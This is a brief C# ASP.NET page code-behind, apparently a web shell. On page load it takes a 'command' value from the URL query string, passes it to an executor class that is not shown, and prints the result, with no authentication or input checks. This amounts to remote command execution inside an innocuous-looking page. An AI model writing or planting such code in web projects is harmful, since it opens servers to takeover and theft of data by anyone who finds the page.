using System;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Diagnostics;
using System.IO;

namespace MyNamespace
{
    public partial class MyClass : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            String command = Request.QueryString["command"];
            if (!string.IsNullOrEmpty(command))
            {
                string result = CommandExecutor.ExecuteCommand(command);
                Response.Write("<pre>" + Server.HtmlEncode(result) + "</pre>");
            }
        }
    }

}